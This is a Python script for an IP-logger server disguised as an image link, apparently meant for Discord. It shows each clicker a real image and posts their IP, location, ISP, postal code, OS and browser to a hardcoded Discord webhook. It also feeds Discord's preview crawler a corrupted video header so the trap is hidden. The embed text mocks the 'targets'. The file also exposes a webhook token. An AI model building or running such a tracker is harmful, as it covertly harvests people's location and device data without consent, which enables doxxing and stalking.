from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpx
import base64
import httpagentparser

# === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

# The real image shown only when they click "Open Link"
bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [
            {
                "title": "DADDY BOB STRIKES AGAIN!",
                "color": 16711803,
                "description": "A New Target Opened The Link LOL.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}",
                        "inline": False
                    }
                ]
            }
        ]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord bot is crawling the link. Expecting a hit soon.\n\n**IP:** {ip}\n**UserAgent:** {uag}",
                "author": {"name": "Fentanyl"}
            }
        ]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get IP and User-Agent
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'
            useragent = self.headers.get('user-agent', 'No User Agent Found!')
            
            # === 1. DISCORD BOT CHECK (THE GLITCH) ===
            # We check for Discord's bot or the MediaProxy
            is_bot = any(x in useragent.lower() for x in ['discord', 'externalhit', 'bot', 'crawler'])
            
            if is_bot:
                # Log that the bot is looking
                httpx.post(webhook, json=prev(ip, useragent))
                
                # We send a "Video" type but a broken header
                # This forces the "Spinning Wheel" on Discord
                self.send_response(200)
                self.send_header('Content-type', 'video/mp4')
                self.send_header('Refresh', '0.1') # Keep it refreshing
                self.end_headers()
                
                # Corrupted MP4/MOV header bits
                self.wfile.write(b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00isommp42')
                return

            # === 2. REAL USER CHECK (THE GRAB) ===
            # If we reach here, it's a real person clicking the link
            os, browser = httpagentparser.simple_detect(useragent)
            
            # Serve the real image
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(bindata)

            # Get IP info from ipinfo.io
            try:
                ip_data = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                payload = formatHook(
                    ip_data.get('ip', ip),
                    ip_data.get('city', 'Unknown'),
                    ip_data.get('region', 'Unknown'),
                    ip_data.get('country', 'Unknown'),
                    ip_data.get('loc', 'Unknown'),
                    ip_data.get('org', 'Unknown'),
                    ip_data.get('postal', 'Unknown'),
                    useragent, os, browser
                )
                httpx.post(webhook, json=payload)
            except:
                # Basic payload if ipinfo fails
                httpx.post(webhook, json=formatHook(ip, '?', '?', '?', '?', '?', '?', useragent, os, browser))

        except Exception as e:
            # Emergency fallback: just send the image
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(bindata)

# Local testing entry point
if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), handler)
    print("Glitch Logger started on port 8080...")
    server.serve_forever()
